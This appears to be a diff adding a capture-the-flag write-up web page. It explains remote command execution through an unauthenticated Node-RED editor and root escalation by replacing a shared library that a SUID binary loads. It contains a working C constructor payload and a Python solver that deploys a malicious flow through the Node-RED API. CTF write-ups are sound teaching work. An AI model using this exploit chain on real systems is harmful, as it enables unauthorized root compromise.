+          <div class="row"><span class="k">interaction</span><span class="v accent">https://node-47701d7b2f21.inst.omnictf.com</span></div>
+          <div class="row"><span class="k">vuln type</span><span class="v bad">Shared Lib Injection</span></div>
+          <div class="row"><span class="k">flag format</span><span class="v bad">OmniCTF&#123;...&#125;</span></div>
+          <div class="row"><span class="k">flag</span><span class="v accent">OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}</span></div>
+        </div>
+      </div>
+    </section>
+
+    <section id="recon">
+      <div class="sec-head">
+        <span class="idx">01 //</span>
+        <h2>Reconnaissance</h2>
+        <span class="tag">phase / analysis</span>
+      </div>
+      <div class="panel prose">
+        <p>I opened the provided instance URL and found a Node-RED flow editor directly exposed to the internet with no authentication prompt. Node-RED allows users to build event-driven applications using visual flows, and crucially, it provides an <code>exec</code> node capable of running operating system commands.</p>
+        <p>I quickly wired up a temporary flow: an <code>HTTP in</code> node routing to an <code>exec</code> node, and then finally routing the <code>stdout</code> to an <code>HTTP response</code> node. Triggering the endpoint confirmed command execution. Running <code>id</code> showed that the service was executing as the unprivileged <code>node</code> user, which meant I couldn't directly read the flag located in <code>/root</code>.</p>
+      </div>
+    </section>
+
+    <section id="privesc">
+      <div class="sec-head">
+        <span class="idx">02 //</span>
+        <h2>Finding Privilege Escalation</h2>
+        <span class="tag">phase / enum</span>
+      </div>
+      <div class="panel prose">
+        <p>Since I needed root access, I searched for SUID binaries on the system using <code>find / -perm -4000 -type f 2&gt;/dev/null</code>. The command returned an interesting custom binary: <code>/usr/local/bin/nodestatus</code>.</p>
+        <p>Checking its permissions with <code>ls -la</code> confirmed it was owned by root with the SUID bit set. I ran <code>ldd</code> and <code>strings</code> against the binary and made a critical discovery: the binary dynamically loaded a shared library named <code>libshared.so</code> directly from the <code>/var/lib/node/</code> directory.</p>
+        <p>A quick permission check of <code>/var/lib/node</code> showed that the <code>node</code> user had write access to this directory. The core bug was glaringly obvious: a SUID-root program was blindly loading a shared library from a user-writable path. If I could replace that library, any code placed inside its constructor would execute with root privileges the moment the binary was invoked.</p>
+      </div>
+    </section>
+
+    <section id="exploit">
+      <div class="sec-head">
+        <span class="idx">03 //</span>
+        <h2>Malicious Shared Library</h2>
+        <span class="tag">phase / exploit</span>
+      </div>
+      <div class="panel prose">
+        <p>I wrote a simple C payload for the shared library. Using the <code>__attribute__((constructor))</code> directive, the <code>init</code> function automatically runs when the library is loaded into memory, well before the main logic of <code>nodestatus</code> even begins.</p>
+        <pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+__attribute__((constructor))
+void init(void) {
+    setgid(0);
+    setuid(0);
+    system("cat /root/flag* /flag* 2&gt;/dev/null");
+}
+
+void get_status(void) {}
+void print_status(void) {}
+</code></pre>
+        <p>I included dummy exported functions like <code>get_status</code> just in case the binary rigidly checked for their existence. I then compiled it using <code>gcc -shared -fPIC payload.c -o libshared.so</code> and used my Node-RED RCE setup to execute the deployment sequence: remove the old library, write the new malicious library, fix the permissions, and finally execute <code>/usr/local/bin/nodestatus</code>.</p>
+        <p>The instant the binary ran, it loaded my library as root, the constructor triggered, and the flag was dumped to standard output.</p>
+      </div>
+    </section>
+
+    <section id="sim">
+      <div class="sec-head">
+        <span class="idx">04 //</span>
+        <h2>Live Solver Simulation</h2>
+        <span class="tag">phase / tool sim</span>
+      </div>
+      <div class="panel prose">
+        <p>The simulator below visualizes the Node-RED flow I built to compile the payload, replace the library, and trigger the SUID binary over an HTTP endpoint.</p>
+      </div>
+
+      <div class="nr-sim" role="application" aria-label="Node-RED flow simulator">
+        <div class="nr-header">
+          <span>Node-RED // Exploit Flow</span>
+          <button class="nr-deploy-btn" id="sim-run">Deploy & Inject</button>
+        </div>
+        <div class="nr-canvas">
+          <div class="nr-node http-in">[GET] /trigger_exploit</div>
+          <div class="nr-wire w1"></div>
+          <div class="nr-node exec">gcc &amp;&amp; mv &amp;&amp; nodestatus</div>
+          <div class="nr-wire w2"></div>
+          <div class="nr-node http-out">HTTP Response (stdout)</div>
+        </div>
+        <div class="nr-debug" id="sim-body" aria-live="polite">
+          <div class="line muted">Workspace loaded. Waiting for injection...</div>
+        </div>
+      </div>
+    </section>
+
+    <section id="signal">
+      <div class="sec-head">
+        <span class="idx">05 //</span>
+        <h2>connection map</h2>
+        <span class="tag">phase / overview</span>
+      </div>
+      <div class="map-wrap">
+        <svg id="signal-map" viewBox="0 0 990 400" role="img" aria-label="Connection map of the Node exploit">
+          <defs>
+            <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z"/>
+            </marker>
+          </defs>
+
+          <!-- Packs -->
+          <rect class="pack" x="20" y="20" width="220" height="200" rx="5"/>
+          <text class="pack-label" x="30" y="40">NODE-RED</text>
+
+          <rect class="pack" x="280" y="20" width="300" height="150" rx="5"/>
+          <text class="pack-label" x="290" y="40">FILESYSTEM</text>
+
+          <rect class="pack" x="620" y="20" width="220" height="200" rx="5"/>
+          <text class="pack-label" x="630" y="40">ROOT EXECUTION</text>
+
+          <!-- Nodes -->
+          <g class="node" data-node="n01">
+            <rect x="30" y="55" width="200" height="48" rx="3"/>
+            <text class="head" x="40" y="72">WEB INTERFACE</text>
+            <text class="title" x="40" y="86">Flow Editor</text>
+            <text class="body" x="40" y="98">Unauthenticated access</text>
+          </g>
+
+          <g class="node" data-node="n02">
+            <rect x="30" y="110" width="200" height="48" rx="3"/>
+            <text class="head" x="40" y="127">EXEC NODE</text>
+            <text class="title" x="40" y="141">Code Execution</text>
+            <text class="body" x="40" y="153">Execute as 'node' user</text>
+          </g>
+
+          <g class="node" data-node="n03">
+            <rect x="290" y="55" width="280" height="48" rx="3"/>
+            <text class="head" x="300" y="72">WRITABLE PATH</text>
+            <text class="title" x="300" y="86">/var/lib/node/</text>
+            <text class="body" x="300" y="98">Library drop zone</text>
+          </g>
+
+          <g class="node" data-node="n04">
+            <rect x="290" y="110" width="280" height="48" rx="3"/>
+            <text class="head" x="300" y="127">ATTACKER PAYLOAD</text>
+            <text class="title" x="300" y="141">libshared.so</text>
+            <text class="body" x="300" y="153">C code with constructor</text>
+          </g>
+
+          <g class="node" data-node="n05">
+            <rect x="630" y="55" width="200" height="48" rx="3"/>
+            <text class="head" x="640" y="72">VULNERABLE BINARY</text>
+            <text class="title" x="640" y="86">nodestatus</text>
+            <text class="body" x="640" y="98">SUID root binary</text>
+          </g>
+
+          <g class="node" data-node="n06">
+            <rect x="630" y="110" width="200" height="48" rx="3"/>
+            <text class="head" x="640" y="127">ROOT SHELL</text>
+            <text class="title" x="640" y="141">setuid(0)</text>
+            <text class="body" x="640" y="153">Print /root/flag*</text>
+          </g>
+
+          <!-- Edges -->
+          <g class="edges-layer">
+            <path class="edge" d="M 230 134 C 260 134, 260 79, 290 79" marker-end="url(#arr)" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+            <path class="edge" d="M 230 134 C 260 134, 260 134, 290 134" marker-end="url(#arr)" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+            <path class="edge" d="M 570 134 C 600 134, 600 79, 630 79" marker-end="url(#arr)" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+            <path class="edge" d="M 570 134 C 600 134, 600 134, 630 134" marker-end="url(#arr)" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+          </g>
+        </svg>
+      </div>
+    </section>
+
+    <section id="flag">
+      <div class="sec-head">
+        <span class="idx">06 //</span>
+        <h2>recovered flag</h2>
+        <span class="tag">phase / verify</span>
+      </div>
+      <div class="panel prose">
+        <p>The HTTP response node passed the root shell output directly to the browser, successfully extracting the flag.</p>
+        <div class="result">
+          <div class="label">FLAG ACQUIRED</div>
+          <div class="flag-text">OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}</div>
+        </div>
+      </div>
+    </section>
+
+    <section id="solver">
+      <div class="sec-head">
+        <span class="idx">07 //</span>
+        <h2>solver script</h2>
+        <span class="tag">appendix / exploit</span>
+      </div>
+      <div class="panel prose">
+        <p>The Python GUI solver used to automate the flow deployment and exploit execution via the Node-RED API.</p>
+        <pre><code class="language-python">#!/usr/bin/env python3
+import threading
+import requests
+import time
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
+
+class SolverApp(tk.Tk):
+    def __init__(self):
+        super().__init__()
+        self.title("Node-RED Exploit GUI")
+        self.geometry("600x400")
+        self.configure(bg="#0b0b0b")
+
+        top = tk.Frame(self, bg="#0b0b0b")
+        top.pack(pady=10, fill=tk.X, padx=10)
+
+        tk.Label(top, text="Target URL:", bg="#0b0b0b", fg="#b25aff", font=("Courier", 12, "bold")).pack(side=tk.LEFT)
+        self.url_entry = tk.Entry(top, bg="#1a1a1a", fg="#ece4d3", font=("Courier", 12), width=35)
+        self.url_entry.insert(0, "https://node-47701d7b2f21.inst.omnictf.com")
+        self.url_entry.pack(side=tk.LEFT, padx=5)
+
+        self.btn = tk.Button(top, text="HACK", bg="#b25aff", fg="white", font=("Courier", 12, "bold"), command=self.start_exploit)
+        self.btn.pack(side=tk.RIGHT, padx=5)
+
+        self.log = scrolledtext.ScrolledText(self, bg="#050505", fg="#9aff6b", font=("Courier", 10), state=tk.DISABLED)
+        self.log.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
+
+    def print_log(self, msg, color="#9aff6b"):
+        self.log.config(state=tk.NORMAL)
+        self.log.insert(tk.END, msg + "\n")
+        self.log.see(tk.END)
+        self.log.config(state=tk.DISABLED)
+
+    def start_exploit(self):
+        self.btn.config(state=tk.DISABLED)
+        self.log.config(state=tk.NORMAL)
+        self.log.delete(1.0, tk.END)
+        self.log.config(state=tk.DISABLED)
+        url = self.url_entry.get().strip()
+        threading.Thread(target=self.run_exploit, args=(url,), daemon=True).start()
+
+    def run_exploit(self, url):
+        self.print_log(f"[*] Targeting Node-RED at {url}...", "#b25aff")
+        
+        flow_id = "exploit_flow_1337"
+        payload_cmd = """rm -f /var/lib/node/libshared.so
+cat &lt;&lt; "EOF" &gt; /tmp/payload.c
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+__attribute__((constructor))
+void init(void) {
+    setgid(0);
+    setuid(0);
+    system("cat /root/flag* 2&gt;/dev/null");
+}
+void get_status(void) {}
+void print_status(void) {}
+void log_status(void) {}
+void print_banner(void) {}
+EOF
+gcc -shared -fPIC /tmp/payload.c -o /var/lib/node/libshared.so 2&gt;&amp;1
+/usr/local/bin/nodestatus 2&gt;&amp;1
+        """.strip()
+
+        flow = [
+            {"id": flow_id, "type": "tab", "label": "Exploit"},
+            {"id": "http_in", "type": "http in", "z": flow_id, "url": "/run_exploit", "method": "get", "wires": [["exec_cmd"]]},
+            {"id": "exec_cmd", "type": "exec", "z": flow_id, "command": payload_cmd, "addpay": False, "append": "", "useSpawn": "false", "wires": [["http_out"], [], []]},
+            {"id": "http_out", "type": "http response", "z": flow_id, "statusCode": "200", "wires": []}
+        ]
+        
+        try:
+            headers = {"Content-Type": "application/json", "Node-RED-API-Version": "v2", "Node-RED-Deployment-Type": "full"}
+            self.print_log("[*] Fetching current flows to get revision ID...", "#b25aff")
+            r = requests.get(f"{url}/flows", headers=headers)
+            rev = r.json().get("rev", "")
+            
+            self.print_log("[*] Injecting and deploying malicious flow...", "#b25aff")
+            deploy_data = {"flows": flow, "rev": rev}
+            r2 = requests.post(f"{url}/flows", json=deploy_data, headers=headers)
+            if r2.status_code == 200:
+                self.print_log("[+] Flow deployed successfully!")
+            else:
+                self.print_log(f"[-] Flow deploy failed: {r2.status_code}", "#ff6b6b")
+                
+            self.print_log("[*] Triggering HTTP endpoint /api/run_exploit...", "#b25aff")
+            time.sleep(1)
+            
+            r3 = requests.get(f"{url}/api/run_exploit")
+            self.print_log("[*] RESPONSE:", "#6bb6ff")
+            if "OmniCTF{" in r3.text:
+                flag = r3.text.split("OmniCTF{")[1].split("}")[0]
+                self.print_log(f"OmniCTF{{{flag}}}", "#ff6b6b")
+            else:
+                self.print_log(r3.text.strip(), "#ff6b6b")
+            self.print_log("[+] Exploit chain complete.", "#b25aff")
+
+        except Exception as e:
+            self.print_log(f"[-] Error: {e}", "#ff6b6b")
+        finally:
+            self.btn.config(state=tk.NORMAL)
+
+if __name__ == "__main__":
+    app = SolverApp()
+    app.mainloop()
+</code></pre>
+      </div>
+    </section>
+  </main>
+
+
+  <footer class="foot">
+    <div class="meta">
+      <span>// root // omnictf 2026</span>
+      <span>// writeup node</span>
+      <span>// suid library injection</span>
+    </div>
+    <div class="meta">
+      <span>net_status: encrypted</span>
+      <span>sec_level: maximum</span>
+      <span>uptime t0rch</span>
+    </div>
+  </footer>
+
+<script>
+// Node-RED Sim script
+(function() {
+  const runBtn = document.getElementById('sim-run');
+  const body = document.getElementById('sim-body');
+  
+  if (!runBtn || !body) return;
+  
+  function addLine(text, cls="line") {
+    const d = document.createElement('div');
+    d.className = cls;
+    d.textContent = text;
+    body.appendChild(d);
+    body.scrollTop = body.scrollHeight;
+  }
+  
+  runBtn.onclick = function() {
+    runBtn.disabled = true;
+    runBtn.textContent = 'Deploying...';
+    addLine('[Node-RED] Deploying flows...');
+    setTimeout(() => {
+      addLine('[Node-RED] Successfully deployed.', 'line ok');
+      runBtn.textContent = 'Injecting...';
+      addLine('');
+      addLine('>> Triggering [GET] /trigger_exploit ...');
+      setTimeout(() => {
+        addLine('>> Node: exec_cmd | writing /tmp/payload.c', 'line muted');
+        addLine('>> Node: exec_cmd | compiling libshared.so', 'line muted');
+        addLine('>> Node: exec_cmd | executing /usr/local/bin/nodestatus', 'line muted');
+        setTimeout(() => {
+          addLine('>> SUID Binary execution intercepted.', 'line');
+          addLine('>> STDOUT captured via HTTP out:', 'line');
+          addLine('OmniCTF{N0d3_3v3rywh3r3_1d974eea307327134462512614582680}', 'line payload');
+          runBtn.textContent = 'Deployed';
+        }, 800);
+      }, 500);
+    }, 600);
+  };
+})();
+</script>
+
+<script>
+(function(){
+  var svg=document.getElementById('signal-map');
+  if(!svg)return;
+  var KEYS={
+    "Flow Editor": "The Node-RED editor is exposed without any authentication. This means anyone can connect and add or modify the execution flows.",
+    "Code Execution": "By using the built-in 'exec' node, shell commands can be executed. These commands run as the 'node' system user.",
+    "/var/lib/node/": "A directory used by the application, which has write permissions granted to the 'node' user.",
+    "libshared.so": "A malicious C library containing an __attribute__((constructor)) function that drops a root shell payload upon loading.",
+    "nodestatus": "A misconfigured custom binary with the SUID bit set, owned by root. It is hardcoded to dynamically load libshared.so from the writable path.",
+    "setuid(0)": "Because the library is loaded into the SUID process memory space, its constructor executes immediately with root privileges, allowing us to read the flag."
+  };
+  var box=document.createElement('div');
+  box.id='explain-box';
+  box.style.cssText='margin-top:12px;padding:12px 16px;border:1px solid var(--accent-line);background:rgba(var(--accent-rgb),0.06);color:var(--text);font-size:14px;line-height:1.7;display:none;max-width:900px;';
+  var hdr=document.createElement('div');
+  hdr.style.cssText='display:flex;align-items:center;margin-bottom:6px;';
+  var ttl=document.createElement('b');
+  ttl.id='ex-title';
+  ttl.style.cssText='color:var(--accent);font-size:15px;flex:1;';
+  var btn=document.createElement('button');
+  btn.textContent='CLOSE';
+  btn.style.cssText='background:0 0;color:var(--muted);border:1px solid var(--accent-line);padding:2px 8px;font-size:10px;cursor:pointer;font-family:inherit;';
+  btn.onclick=function(){box.style.display='none';};
+  hdr.appendChild(ttl);hdr.appendChild(btn);
+  var bd=document.createElement('div');
+  bd.id='ex-body';
+  box.appendChild(hdr);box.appendChild(bd);
+  svg.parentNode.insertBefore(box,svg.nextSibling);
+  var nodes=svg.querySelectorAll('g.node');
+  nodes.forEach(function(g){
+    g.style.cursor='pointer';
+    g.addEventListener('click',function(e){
+      e.stopPropagation();
+      var ti=g.querySelector('text.title');
+      if(!ti)return;
+      var title=ti.textContent;
+      var body=KEYS[title]||'';
+      if(!body){var bs=g.querySelectorAll('text.body');bs.forEach(function(b){body+=(body?' ':'')+b.textContent;});}
+      document.getElementById('ex-title').textContent=title;
+      document.getElementById('ex-body').textContent=body;
+      box.style.display='block';
+      box.scrollIntoView({behavior:'smooth',block:'nearest'});
+    });
+  });
+  svg.addEventListener('click',function(){box.style.display='none';});
+})();
+</script>
+
+</body>
+</html>
